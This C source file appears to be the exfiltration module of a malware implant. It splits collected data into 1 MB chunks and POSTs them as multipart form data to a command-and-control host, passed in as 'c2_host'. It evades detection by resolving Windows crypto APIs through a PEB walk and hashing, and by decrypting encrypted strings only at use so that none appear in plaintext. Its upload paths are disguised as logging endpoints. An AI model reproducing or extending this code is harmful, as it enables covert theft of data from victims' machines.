#include "chunked.h"
#include "ws2.h"
#include "enc_strings.h"
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>

/* PEB-walk API resolution for advapi32 Crypt* functions */
typedef BOOL (WINAPI *pCryptAcquireContextA)(HCRYPTPROV *, LPCSTR, LPCSTR, DWORD, DWORD);
typedef BOOL (WINAPI *pCryptGenRandom)(HCRYPTPROV, DWORD, BYTE *);
typedef BOOL (WINAPI *pCryptReleaseContext)(HCRYPTPROV, DWORD);

static struct {
    pCryptAcquireContextA pCA;
    pCryptGenRandom       pGR;
    pCryptReleaseContext  pRC;
    int ready;
} g_crypt_api;

static int crypt_ensure_api(void) {
    if (g_crypt_api.ready) return 1;
    char dll[32]; enc_decrypt(enc_advapi32, ENC_ADVAPI32_LEN, dll);
    void *adv = mirage_get_module_by_hash(mirage_encrypted_hash_module(dll));
    if (!adv) return 0;
    char fn[32];
    enc_decrypt(enc_CryptAcquireContextA, ENC_CRYPTACQUIRECONTEXTA_LEN, fn);
    g_crypt_api.pCA = (pCryptAcquireContextA)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CryptGenRandom, ENC_CRYPTGENRANDOM_LEN, fn);
    g_crypt_api.pGR = (pCryptGenRandom)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    enc_decrypt(enc_CryptReleaseContext, ENC_CRYPTRELEASECONTEXT_LEN, fn);
    g_crypt_api.pRC = (pCryptReleaseContext)mirage_get_function_by_hash(adv, mirage_encrypted_hash_func(fn));
    if (!g_crypt_api.pCA || !g_crypt_api.pGR || !g_crypt_api.pRC) return 0;
    g_crypt_api.ready = 1;
    return 1;
}
#else
#include <fcntl.h>
#include <unistd.h>
#endif

#define CHUNK_SIZE       (1024u * 1024u)  /* 1 MB */
#define MAX_RETRIES      3u

/* Encrypted at build time — decrypted at use via enc_decrypt() */
/* chunk_boundary, complete_boundary, chunk_path, complete_path moved to enc_strings.h */

/* ── session id generation ─────────────────────────────────────── */

char *chunked_generate_session_id(void) {
    uint8_t raw[16];
#ifdef _WIN32
    HCRYPTPROV hProv;
    if (!crypt_ensure_api() || !g_crypt_api.pCA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return NULL;
    if (!g_crypt_api.pGR(hProv, sizeof(raw), raw)) {
        g_crypt_api.pRC(hProv, 0);
        return NULL;
    }
    g_crypt_api.pRC(hProv, 0);
#else
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) return NULL;
    ssize_t r = read(fd, raw, sizeof(raw));
    close(fd);
    if (r != sizeof(raw)) return NULL;
#endif

    char *hex = malloc(33);
    if (!hex) return NULL;
    for (int i = 0; i < 16; ++i)
        snprintf(hex + i * 2, 3, "%02x", raw[i]);
    hex[32] = '\0';
    return hex;
}

/* ── multipart body builders ───────────────────────────────────── */

static void append_field(uint8_t **buf, size_t *len, size_t *cap,
                         const char *data, size_t dlen) {
    while (*len + dlen > *cap) {
        *cap = (*cap) ? (*cap) * 2 : 4096;
        *buf = realloc(*buf, *cap);
    }
    memcpy(*buf + *len, data, dlen);
    *len += dlen;
}

#define APPEND_STR(buf, len, cap, s) \
    append_field((buf), (len), (cap), (s), strlen(s))

#define APPEND_LIT(buf, len, cap, s) \
    append_field((buf), (len), (cap), (s), sizeof(s) - 1)

uint8_t *chunked_build_chunk_body(
    const char  *boundary,
    const char  *session_id,
    size_t       chunk_index,
    const uint8_t *chunk_data,
    size_t       chunk_len,
    size_t      *out_len)
{
    uint8_t *buf = NULL;
    size_t len = 0, cap = 0;

    /* session_id field */
    APPEND_LIT(&buf, &len, &cap, "--");
    APPEND_STR(&buf, &len, &cap, boundary);
    APPEND_LIT(&buf, &len, &cap,
        "\r\nContent-Disposition: form-data; name=\"session_id\"\r\n\r\n");
    APPEND_STR(&buf, &len, &cap, session_id);
    APPEND_LIT(&buf, &len, &cap, "\r\n");

    /* chunk_index field */
    APPEND_LIT(&buf, &len, &cap, "--");
    APPEND_STR(&buf, &len, &cap, boundary);
    APPEND_LIT(&buf, &len, &cap,
        "\r\nContent-Disposition: form-data; name=\"chunk_index\"\r\n\r\n");
    char idx_buf[32];
    int n = snprintf(idx_buf, sizeof(idx_buf), "%zu", chunk_index);
    append_field(&buf, &len, &cap, idx_buf, (size_t)n);
    APPEND_LIT(&buf, &len, &cap, "\r\n");

    /* data field */
    APPEND_LIT(&buf, &len, &cap, "--");
    APPEND_STR(&buf, &len, &cap, boundary);
    APPEND_LIT(&buf, &len, &cap,
        "\r\nContent-Disposition: form-data; name=\"data\"; filename=\"chunk.bin\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n");
    append_field(&buf, &len, &cap, (const char *)chunk_data, chunk_len);
    APPEND_LIT(&buf, &len, &cap, "\r\n");

    /* closing boundary */
    APPEND_LIT(&buf, &len, &cap, "--");
    APPEND_STR(&buf, &len, &cap, boundary);
    APPEND_LIT(&buf, &len, &cap, "--\r\n");

    *out_len = len;
    return buf;
}

uint8_t *chunked_build_complete_body(
    const char  *boundary,
    const char  *session_id,
    size_t       total_chunks,
    const char  *metadata,
    size_t       metadata_len,
    size_t      *out_len)
{
    uint8_t *buf = NULL;
    size_t len = 0, cap = 0;

    /* session_id */
    APPEND_LIT(&buf, &len, &cap, "--");
    APPEND_STR(&buf, &len, &cap, boundary);
    APPEND_LIT(&buf, &len, &cap,
        "\r\nContent-Disposition: form-data; name=\"session_id\"\r\n\r\n");
    APPEND_STR(&buf, &len, &cap, session_id);
    APPEND_LIT(&buf, &len, &cap, "\r\n");

    /* total_chunks */
    APPEND_LIT(&buf, &len, &cap, "--");
    APPEND_STR(&buf, &len, &cap, boundary);
    APPEND_LIT(&buf, &len, &cap,
        "\r\nContent-Disposition: form-data; name=\"total_chunks\"\r\n\r\n");
    char tc_buf[32];
    int n = snprintf(tc_buf, sizeof(tc_buf), "%zu", total_chunks);
    append_field(&buf, &len, &cap, tc_buf, (size_t)n);
    APPEND_LIT(&buf, &len, &cap, "\r\n");

    /* metadata */
    APPEND_LIT(&buf, &len, &cap, "--");
    APPEND_STR(&buf, &len, &cap, boundary);
    APPEND_LIT(&buf, &len, &cap,
        "\r\nContent-Disposition: form-data; name=\"metadata\"\r\n\r\n");
    if (metadata && metadata_len > 0)
        append_field(&buf, &len, &cap, metadata, metadata_len);
    APPEND_LIT(&buf, &len, &cap, "\r\n");

    /* closing boundary */
    APPEND_LIT(&buf, &len, &cap, "--");
    APPEND_STR(&buf, &len, &cap, boundary);
    APPEND_LIT(&buf, &len, &cap, "--\r\n");

    *out_len = len;
    return buf;
}

#undef APPEND_LIT
#undef APPEND_STR

/* ── HTTP POST multipart helper ────────────────────────────────── */

static int http_post_multipart(
    const char  *host,
    uint16_t     port,
    const char  *path,
    const char  *token,
    const char  *boundary,
    const uint8_t *body,
    size_t       body_len)
{
    /* build Content-Type header */
    char ct_hdr[256];
    int ct_len = snprintf(ct_hdr, sizeof(ct_hdr),
        "Content-Type: multipart/form-data; boundary=%s", boundary);

    char auth_hdr[512];
    int ah_len = snprintf(auth_hdr, sizeof(auth_hdr), "Bearer %s", token);

    /* build full request */
    size_t hdr_cap = 2048;
    size_t hdr_len = 0;
    char *hdr = malloc(hdr_cap);
    if (!hdr) return 0;

    /* request line */
    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
        "POST %s HTTP/1.1\r\n", path);
    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
        "Host: %s\r\n", host);
    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
        "Authorization: %s\r\n", auth_hdr);
    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
        "%s\r\n", ct_hdr);
    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
        "Content-Length: %zu\r\n", body_len);
    hdr_len += snprintf(hdr + hdr_len, hdr_cap - hdr_len,
        "Connection: close\r\n\r\n");

    ws2_socket_t sk;
    ws2_result_t r = ws2_connect(&sk, host, port);
    if (r != WS2_OK) { free(hdr); return 0; }

    size_t sent;
    r = ws2_send(sk.handle, (const uint8_t *)hdr, hdr_len, &sent);
    free(hdr);
    if (r != WS2_OK) { ws2_close(sk.handle); return 0; }

    r = ws2_send(sk.handle, body, body_len, &sent);
    if (r != WS2_OK) { ws2_close(sk.handle); return 0; }

    /* read response — look for "200" */
    char resp[4096];
    size_t total = 0, chunk;
    while (total < sizeof(resp) - 1) {
        r = ws2_recv(sk.handle, (uint8_t *)resp + total,
                      sizeof(resp) - 1 - total, &chunk);
        if (r != WS2_OK || chunk == 0) break;
        total += chunk;
    }
    resp[total] = '\0';
    ws2_close(sk.handle);

    return (total >= 12 && memcmp(resp, "HTTP/1.1 200", 12) == 0);
}

/* ── chunked upload ────────────────────────────────────────────── */

chunk_result_t chunked_upload(
    const char   *c2_host,
    uint16_t      c2_port,
    const char   *token,
    const uint8_t *data,
    size_t        data_len,
    const char   *metadata,
    size_t        metadata_len)
{
    /* Decrypt strings at use — no plaintext in .rdata */
    char _b1[64], _b2[64], _p1[64], _p2[64];
    enc_decrypt(enc_boundary_zialfi_chunk, ENC_BOUNDARY_ZIALFI_CHUNK_LEN, _b1);
    enc_decrypt(enc_boundary_zialfi_complete, ENC_BOUNDARY_ZIALFI_COMPLETE_LEN, _b2);
    enc_decrypt(enc_api_log_chunk, ENC_API_LOG_CHUNK_LEN, _p1);
    enc_decrypt(enc_api_log_complete, ENC_API_LOG_COMPLETE_LEN, _p2);
    const char *chunk_boundary    = _b1;
    const char *complete_boundary = _b2;
    const char *chunk_path        = _p1;
    const char *complete_path     = _p2;

    char *session_id = chunked_generate_session_id();
    if (!session_id) return CHUNK_FAILED;

    size_t total_chunks = (data_len + CHUNK_SIZE - 1) / CHUNK_SIZE;

    /* upload each chunk */
    for (size_t i = 0; i < total_chunks; ++i) {
        size_t start = i * CHUNK_SIZE;
        size_t end   = start + CHUNK_SIZE;
        if (end > data_len) end = data_len;

        size_t body_len = 0;
        uint8_t *body = chunked_build_chunk_body(
            chunk_boundary, session_id, i,
            data + start, end - start, &body_len);
        if (!body) { free(session_id); return CHUNK_FAILED; }

        int ok = 0;
        for (uint32_t attempt = 0; attempt < MAX_RETRIES; ++attempt) {
            if (http_post_multipart(c2_host, c2_port, chunk_path,
                                    token, chunk_boundary, body, body_len)) {
                ok = 1;
                break;
            }
        }
        free(body);
        if (!ok) { free(session_id); return CHUNK_PARTIAL; }
    }

    /* send complete signal */
    size_t cbody_len = 0;
    uint8_t *cbody = chunked_build_complete_body(
        complete_boundary, session_id, total_chunks,
        metadata, metadata_len, &cbody_len);
    if (!cbody) { free(session_id); return CHUNK_FAILED; }

    int ok = 0;
    for (uint32_t attempt = 0; attempt < MAX_RETRIES; ++attempt) {
        if (http_post_multipart(c2_host, c2_port, complete_path,
                                token, complete_boundary, cbody, cbody_len)) {
            ok = 1;
            break;
        }
    }
    free(cbody);
    free(session_id);

    return ok ? CHUNK_COMPLETE : CHUNK_PARTIAL;
}
